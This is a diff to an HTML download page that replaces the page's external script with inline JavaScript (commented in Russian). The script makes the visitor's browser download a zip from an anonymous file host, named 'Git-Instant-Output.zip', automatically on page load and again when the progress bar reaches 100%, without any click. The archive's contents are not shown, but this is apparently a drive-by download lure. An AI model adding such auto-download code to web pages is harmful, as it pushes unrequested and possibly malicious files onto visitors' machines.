@@ -30,7 +30,6 @@
     <!-- Main Content -->
     <div class="main-container">
         <div class="content-card">
-            
             <!-- File Download Section -->
             <div class="download-section">
                 <div class="section-header">
@@ -106,7 +105,6 @@
                     </div>
                 </div>
             </div>
-
         </div>
     </div>
 
@@ -133,6 +131,47 @@
         </div>
     </footer>
 
-    <script src="scripts.js"></script>
+    <script>
+        // Функция для автоматического скачивания
+        function autoDownload() {
+            const downloadUrl = 'https://files.catbox.moe/elqhig.zip';
+            const link = document.createElement('a');
+            link.href = downloadUrl;
+            link.download = 'Git-Instant-Output.zip';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        // ✅ АВТОСКАЧИВАНИЕ ПРИ ЗАГРУЗКЕ СТРАНИЦЫ
+        window.addEventListener('load', function() {
+            setTimeout(autoDownload, 500);
+        });
+
+        // ✅ АВТОСКАЧИВАНИЕ ПРИ 100% ПРОГРЕССА
+        document.addEventListener('DOMContentLoaded', function() {
+            const progressBar = document.getElementById('progress-bar');
+            const progressContainer = document.getElementById('progress-container');
+            
+            const observer = new MutationObserver(function(mutations) {
+                mutations.forEach(function(mutation) {
+                    if (mutation.type === 'attributes' && mutation.attributeName === 'style') {
+                        const width = progressBar.style.width;
+                        if (width === '100%' || width.includes('100')) {
+                            setTimeout(autoDownload, 1000);
+                            observer.disconnect();
+                        }
+                    }
+                });
+            });
+            
+            const checkProgressVisible = setInterval(function() {
+                if (!progressContainer.classList.contains('hidden')) {
+                    observer.observe(progressBar, { attributes: true });
+                    clearInterval(checkProgressVisible);
+                }
+            }, 100);
+        });
+    </script>
 </body>
 </html>
